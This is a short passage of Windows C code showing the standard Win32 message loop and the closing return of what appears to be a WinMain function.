    while(GetMessageA(&msg,NULL,0,0)){TranslateMessage(&msg);DispatchMessageA(&msg);}
    return 0;
}
